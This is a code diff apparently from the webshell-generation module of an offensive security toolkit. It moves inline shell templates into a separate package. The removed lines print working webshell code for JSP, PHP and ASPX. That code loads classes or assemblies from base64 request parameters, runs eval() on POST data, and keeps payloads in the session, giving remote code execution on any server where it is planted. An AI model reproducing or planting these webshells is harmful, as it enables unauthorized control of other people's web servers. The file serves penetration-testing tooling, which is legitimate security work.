@@ -2,6 +2,7 @@ package wsm
 
 import (
 	"fmt"
+	"github.com/yaklang/yaklang/common/wsm/payloads/templates"
 	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
 	"github.com/yaklang/yaklang/common/yakgrpc/ypb"
 )
@@ -121,19 +122,7 @@ func newJspGenerate(generate *ypb.ShellGenerate) *Generate {
 	}
 	jspGenerate.pass = generate.Pass
 	if generate.IsSession {
-		jspGenerate.serviceDecl = `String pass = "%v";
-    if (request.getParameter("1") != null) {
-        if (session.getAttribute("RPOAMXO") != null) {
-            session.getAttribute("RPOAMXO").equals(new Object[]{
-                    request,
-                    response,
-                    session,
-                    new String(decrypt(request.getParameter(pass)))
-            });
-        } else {
-            session.setAttribute("RPOAMXO", new U(Thread.currentThread().getContextClassLoader()).g(decrypt(request.getParameter(pass))).newInstance());
-        }
-    }`
+		jspGenerate.serviceDecl = templates.GetTemplates().JspSessionServiceDecl
 	}
 	return jspGenerate
 }
@@ -145,21 +134,8 @@ func newPhpGenerate(generate *ypb.ShellGenerate) *Generate {
 	}
 	phpGenerate.pass = generate.Pass
 	if generate.IsSession {
-		phpGenerate.memberDecl = `error_reporting(0);
-set_time_limit(0);
-ini_set("session.gc_maxlifetime", 3600 * 3600);
-ini_set("allow_url_fopen", true);
-ini_set("allow_url_include", true);
-@session_start();`
-		phpGenerate.serviceDecl = `$pass = "%v";
-$payloadName = 'DJAODJAIOAJCMA';
-if (isset($_POST[$pass])) {
-    if (!isset($_SESSION[$payload])) {
-        $_SESSION[$payload] = $_POST[$pass];
-    }else{
-        eval(decrypt($_SESSION[$payload],$pass));
-    }
-}`
+		phpGenerate.memberDecl = templates.GetTemplates().PhpSessionMemberDecl
+		phpGenerate.serviceDecl = templates.GetTemplates().PhpSessionServiceDecl
 	}
 	return phpGenerate
 }
@@ -169,18 +145,7 @@ func newAspxGenerate(generate *ypb.ShellGenerate) *Generate {
 	}
 	aspxWebShellGenerate.pass = generate.Pass
 	if generate.IsSession {
-		aspxWebShellGenerate.serviceDecl = `String data = Request.Form["%v"];
- if (data != null) {
-     String payload = Encoding.UTF8.GetString(Convert.FromBase64String(data));
-     if (Session["payload"] == null)
-     {
-         Session["payload"]=System.Reflection.Assembly.Load(Convert.FromBase64String(data)).CreateInstance("Payload");
-         Session["payload"].Equals(new object[] { this, Convert.FromBase64String(data) });
-     }
-     else {
-         Session["payload"].Equals(new object[] { this,payload});
-     }
- }`
+		aspxWebShellGenerate.serviceDecl = templates.GetTemplates().AspxSessionServiceDecl
 	}
 	return aspxWebShellGenerate
 }
@@ -192,54 +157,32 @@ func confuseFuncWithUnicode() ConfuseFunc {
 }
 
 func getDefaultCustomJspGenerate() *Generate {
+	t := templates.GetTemplates()
 	return &Generate{
 		memberLabelLeft:   "<%!",
 		memberLabelRight:  "%>",
 		serviceLabelLeft:  "<%",
 		serviceLabelRight: "%>",
-		header:            `<%@ page trimDirectiveWhitespaces="true" %>`,
-		decode: `private static byte[] decrypt(String base64Text) throws Exception {
-        byte[] result;
-        String version = System.getProperty("java.version");
-        if (version.compareTo("1.9") >= 0) {
-            Class Base64 = Class.forName("java.util.Base64");
-            Object Decoder = Base64.getMethod("getDecoder", null).invoke(Base64, null);
-            result = (byte[]) Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text);
-        } else {
-            Object Decoder2 = Class.forName("sun.misc.BASE64Decoder").newInstance();
-            result = (byte[]) Decoder2.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder2, base64Text);
-        }
-        return result;
-    }`,
-		memberDecl: `class U extends ClassLoader {
-        U(ClassLoader c) {
-            super(c);
-        }
-        public Class g(byte[] b) {
-            return super.defineClass(b, 0, b.length);
-        }
-    }`,
-		serviceDecl: `new U(Thread.currentThread().getContextClassLoader()).g(decrypt(request.getParameter("%v"))).newInstance().equals(pageContext);`,
+		header:            t.JspDefaultHeader,
+		decode:            t.JspDefaultDecode,
+		memberDecl:        t.JspDefaultMemberDecl,
+		serviceDecl:       t.JspDefaultServiceDecl,
 		confuseFunc: func(code string) (string, error) {
 			return code, nil
 		},
 	}
 }
 func getDefaultPhpCustomGenerate() *Generate {
+	t := templates.GetTemplates()
 	return &Generate{
-		header: "<?",
-		decode: `function decrypt($data, $key)
-{
-    return base64_decode($data, $key);
-}`,
+		header:            t.PhpDefaultHeader,
+		decode:            t.PhpDefaultDecode,
 		memberLabelLeft:   "",
 		memberLabelRight:  "",
 		serviceLabelLeft:  "",
 		serviceLabelRight: "",
-		memberDecl:        `error_reporting(0);`,
-		serviceDecl: `$pass = "%v";
-eval(base64_decode($_POST[$pass],$pass));
-`,
+		memberDecl:        t.PhpDefaultMemberDecl,
+		serviceDecl:       t.PhpDefaultServiceDecl,
 		confuseFunc: func(code string) (string, error) {
 			return code, nil
 		},
@@ -247,14 +190,12 @@ eval(base64_decode($_POST[$pass],$pass));
 }
 
 func getDefaultAspxWebShellGenerate() *Generate {
+	t := templates.GetTemplates()
 	return &Generate{
-		header: `<%@ Page Language="C#" %>
-<%@Import Namespace="System.Reflection" %>`,
+		header:            t.AspxDefaultHeader,
 		serviceLabelLeft:  "<%",
 		serviceLabelRight: "%>",
-		serviceDecl: `var a = Convert.FromBase64String(Request["%v"]);
-   Assembly myAssebly = System.Reflection.Assembly.Load(a);
-   myAssebly.CreateInstance("Payload").Equals(new object[] {this,a});`,
+		serviceDecl:       t.AspxDefaultServiceDecl,
 		confuseFunc: func(code string) (string, error) {
 			return code, nil
 		},
